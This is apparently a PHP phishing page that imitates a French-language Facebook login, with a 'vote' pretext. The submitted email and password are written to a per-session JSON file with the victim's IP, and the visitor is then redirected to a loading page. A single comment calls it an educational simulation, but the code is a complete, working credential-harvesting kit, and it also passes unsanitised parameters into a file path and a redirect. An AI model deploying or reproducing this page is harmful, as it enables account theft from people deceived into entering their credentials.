<?php
// ⚠️ This is a phishing simulation for educational awareness only.
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
$errorMessage = '';

if (empty($sessionId) || empty($clientIp)) die("Paramètres manquants");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    if (!empty($email) && !empty($password)) {
        file_put_contents("sessions/$sessionId.json", json_encode([
            'email' => $email,
            'password' => $password,
            'timestamp' => time(),
            'ip' => $clientIp
        ]));
        header("Location: loading.php?session=$sessionId&ip=$clientIp");
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Se connecter à Facebook</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>body{margin:0;padding:20px;font-family:Segoe UI;background:#f0f2f5}.container{max-width:400px;margin:auto;text-align:center;background:white;padding:20px;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1)}input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:6px}button{background:#1877f2;color:white;padding:10px 0;border:none;border-radius:6px;width:100%;cursor:pointer}</style>
</head>
<body>
    <div class="container">
        <img src="https://logodownload.org/wp-content/uploads/2014/09/facebook-logo-15.png" width="150" alt="Facebook">
        <h2>Accédez à votre compte pour voter</h2>
        <form method="post">
            <input name="email" placeholder="Email ou téléphone" required>
            <input name="password" type="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
    </div>
</body>
</html>
